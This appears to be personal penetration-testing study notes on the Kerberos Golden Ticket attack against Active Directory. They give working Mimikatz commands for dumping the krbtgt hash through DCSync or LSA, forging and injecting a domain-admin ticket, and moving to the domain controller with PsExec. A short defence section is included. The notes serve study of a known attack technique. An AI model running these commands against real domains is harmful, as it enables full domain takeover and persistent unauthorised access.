public:: true

- As we saw in the [[Kerberos]] authentication specification, [TGT](((655a4269-21dc-4947-a21d-5c89e404b561)))s are always encrypted with the password (NTML hash) of the *krbtgt* user, and valid issued TGTs specify privileges of the requesting user.
- The [Golden Ticket](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf) technique aims to steal the password NTLM hash of the *krbtgt* user, then use it to offline forge TGTs filled with additional privileges for any domain-user on-demand.
- #+BEGIN_IMPORTANT
  You can think at **Golden Ticket** as a **passepartout for any resource** in the domain.
  #+END_IMPORTANT
- *[KRBTGT account](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#krbtgt-account)* recap
	- Is a local default account that acts as a service account for the [Key Distribution Center](((6565b3f7-61b6-4b2a-a59d-01d20e6acd96))) (KDC) service.
	- This account cannot be deleted.
	- The account name cannot be changed.
	- KRBTGT is also the [Service Principal Name](((655e0fad-5b48-42ce-b82a-09cd0e4a9322))) (SPN) used by the KDC for a Windows Server domain.
	- The account is created automatically when a new domain is created.
		- A strong password is assigned automatically.
		- Its password **is not** automatically changed.
	- The password of the KRBTGT account is known only by the Kerberos service ([DC](((65a7a0b2-f9d2-436b-b4f2-369427fa7489)))).
		- The hash of its password is used to encrypt/decrypt [TGT](((655a4269-21dc-4947-a21d-5c89e404b561)))s.
		- The hash of its password is used to sign/verify [PAC](((655f3e21-772b-48c3-b6e6-bd342fb92403)))s.
	- The KRBTGT account stores the two most recent passwords in the password history.
- Retrieve the *krbtgt* password hash
	- Via [[DCSync]]
		- If we have enough privileges to perform DCSync, then we could request the *krbtgt* password hash to any DCs.
		  ```mimikatz
		  lsadump::dcsync /user:krbtgt
		  ```
	- With [[Mimikatz]]
		- We need access to a domain controller with a local administrator account in order to successfully run Mimikatz.
		- From a compromised domain controller
		  ```mimikatz
		  privilege::debug
		  lsadump::lsa /patch
		  ```
- Forge TGT with stolen *krbtgt* password (NTML hash) and inject it in-memory
	- Ingredients
		- *krbtgt* password hash
		- Domain [SID](((65a7d701-e9cd-40ea-aa80-7322b2b18fee)))
	- With [[Mimikatz]] from a domain-joined machine (not the DC)
	  id:: 65a7d51a-e45d-454a-b4fd-7f314589d634
		- First delete any existing loaded tickets (TGT, TGS) with [`kerberos::purge`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#purge)
		  ```mimikatz
		  kerberos::purge
		  ```
		- Forge and inject fully privileged TGT with [`kerberos::golden`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver)
		  ```mimikatz
		  kerberos::golden \
		  	/user:jen \
		      /domain:corp.com \
		  	/sid:S-1-5-21-1987370270-658905905-1781884369 \
		      /krbtgt:1693c6cefafffc7af11ef34d1c788f47 \
		      /ptt
		  ```
			- `/user` is the username you want to impersonate
			  logseq.order-list-type:: number
			- `/domain` is the fully qualified domain name
			  logseq.order-list-type:: number
			- `/sid` is the SID of the domain
			  logseq.order-list-type:: number
			- `/krbtgt` is the hash of the *krbtgt* account password
			  logseq.order-list-type:: number
			- `/ptt` no output in file, just inject the golden ticket in current session
			  logseq.order-list-type:: number
			- Since this ticket is not emitted by the real KDC, it's not limited to allowed cipher methods.
			- By default, the Golden Ticket default lifetime is *10 years*, but can be configured via `/startoffset`, `/endin`, `/renewmax` *(in munutes)*.
			- By default the user ID is `500` (RID of built-in administrator) for the requesting user, but can be configured via `/id`.
			- By default assigned group IDs are `513,512,520,518,519` for well-known Administrator's groups, but can be configured via `/groups`.
				- The first specified group ID of the list is set as primary group for the user.
		- With the forged TGT loaded in-memory we can spawn a privileged shell directly from Mimikatz via [`misc::cmd`](https://tools.thehacker.recipes/mimikatz/modules/misc/cmd) and from there move laterally with [[psexec]] 
		  ```cmd
		  PsExec.exe \\dc1 cmd.exe
		  ```
			- By checking privileges with `whoami /groups` we can confirm that now *jen* is part of the **Domain Admins** group!
- #+BEGIN_WARNING
  Please note that we need to use [[Overpass-The-Hash]] (e.g. calling `PsExec.exe` against the DC hostname) to make use of the newly forged TGT.
  
  If we fallback to [[NTLM Authentication]] (e.g. calling `PsExec.exe` against the DC IP address) then the TGT won't be used and we won't be able to leverage the additional privileges Mimikatz equipped into it. 
  #+END_WARNING
- Defeat Golden Ticket
	- If a domain admin realizes that the *krbtgt* account has been compromised, then he has to either
		- [Change](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#krbtgt-account-maintenance-considerations) the account password
		- [Reset](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#security-considerations) the account password
	- Luckily for us, none of these steps are [as easy as it sounds](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#security-considerations) 😈.